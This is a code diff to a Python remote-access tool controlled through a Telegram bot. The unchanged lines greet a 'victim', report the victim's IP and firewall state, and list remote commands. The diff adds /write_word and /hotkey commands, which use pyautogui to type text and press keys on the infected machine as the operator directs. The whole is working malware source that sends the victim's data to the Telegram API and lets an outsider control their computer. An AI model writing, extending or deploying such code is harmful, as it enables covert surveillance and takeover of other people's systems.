@@ -16,6 +16,7 @@ if check_internret():
     from time import tzname, sleep, strftime
     from getpass import getuser
     from Its_Hub import Its_Hub
+    from pyautogui import write, hotkey
     Hub = Its_Hub()
     os = Hub.OS()
     mouse = Hub.Mouse()
@@ -55,7 +56,9 @@ if check_internret():
                 "/chruns",
                 "/drivers",
                 "/localhost", 
-                "/open_app"]
+                "/open_app", 
+                "/write_word", 
+                "/hotkey"]
     def send_msg(message, token=token, id=id):
         try:
             url = f"https://api.telegram.org/bot{token}/sendmessage?chat_id={id}&text={message}"
@@ -358,6 +361,19 @@ Firewall state: {getoutput("netsh advfirewall show publicprofile").replace("----
                         send_msg(f"{name} application is opened.")
                     except FileNotFoundError:
                         send_msg("File not found.")
+                if command == "/write_word":
+                    send_msg("write your text(in 5 seconds):")
+                    sleep(5)
+                    text = read_msg()
+                    write(text)
+                    send_msg(f"{text} is writed")
+                if command == "/hotkey":
+                    send_msg("write your hotkeys(in 10 seconds || split with space):")
+                    sleep(10)
+                    all_key = str(read_msg()).split(" ")
+                    len_key = len(all_key)
+                    if len_key == 1 and len_key != 0: hotkey(all_key[0])
+                    else: hotkey(all_key[0], all_key[1])
                 send_msg("click /pass")
                 sleep(5)
     send_msg(f"Connected to victim with {ip}(local: {local_ip}) at {strftime("%H:%M:%S")}(Wait for closing trap. write /commands for help).")
